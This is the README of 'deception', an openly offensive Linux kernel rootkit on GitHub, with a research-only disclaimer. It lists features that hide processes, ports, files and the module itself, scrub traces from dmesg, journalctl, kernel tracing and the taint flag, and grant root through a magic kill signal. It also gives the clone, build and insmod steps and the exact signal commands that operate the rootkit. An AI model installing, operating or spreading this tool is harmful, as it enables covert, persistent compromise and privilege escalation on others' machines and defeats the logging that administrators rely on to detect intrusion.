<img width="1280" height="640" alt="decption" src="https://github.com/user-attachments/assets/a26b026f-6d30-43fc-96cb-c3c6030855b9" />

### Advanced Ultra Stealth LKM Rootkit<br>

<b>Notice!</b> This software is provided solely for the purpose of research and is <b>not</b> intended to be used illegally or unethically. By cloning this repository or copying the source code herewithin, you are agreeing that you will <b>only</b> use this on your own machines for the purpose of research or on any other machine that you have permission to install it on. Use of this rootkit on systems which you do not have authorized access to <b>may</b> violate the computer fraud and abuse act.<br>

### Features included with deception<br>
<b>* IPv6 based LKM rootkit:</b> Hooks specifically IPv6 and not IPv4. Use IPv6!<br>
<b>* Process Hiding:</b> Hide multiple processes. You can unhide them one at a time or all at once.<br>
<b>* Port Hiding:</b> Hide multiple ports using a kill signal. Unhide them one at a time or all at once.<br>
<b>* Module Hiding:</b> Removes module from /proc/modules as well as /sys/module.<br>
<b>* File/Directory Hiding:</b> Any file or directory starting with secret_ will be hidden.<br>
<b>* Privilege Escalation:</b> The correct kill signal and magic number gives root privileges.<br><br>

### Additional stealth features
<b>* Hides from /dev/kmsg and dmesg:</b> No tainted/out-of-tree/unsigned entries in dmesg or /dev/kmsg.<br>
<b>* Hides our hooks from kernel tracing files:</b> Any entries showing deception are filtered.<br>
<b>* Hides from journalctl:</b> Deception does not show up anywhere in journalctl.<br>
<b>* Filters /proc/kallsyms:</b> Looking up the address of __x64_sys_kill will return nothing.<br>
<b>* Sets kernel tainted_mask to 0:</b> in /proc/sys/kernel/tainted. Indicates that the kernel has not been tainted<br><br>

Clone this repository, run make and install module
```
git clone https://github.com/carls0n/deception
```
```
cd deception
```
```
make
```
```
sudo insmod deception.ko
```
Hide a process - hide as many processes as you want! Toggles visible/hidden.
```
kill -62 4214
```
Unhide all processes
```
kill -62 0
```
Hide a port. Hide as many ports as you want! Toggles visible/hidden state.
```
kill -61 8080
```
Unhide all ports
```
kill -61 0
```
Gain root privileges. Magic number can be configured in source code
```
kill -64 31337
```
Starts out hidden from both procfs and sysfs. Can't be removed without a reboot.

You might also enjoy reading <a href="https://carls0n.github.io">defeating LKM and LD_PRELOAD rootkits for fun and profit</a>
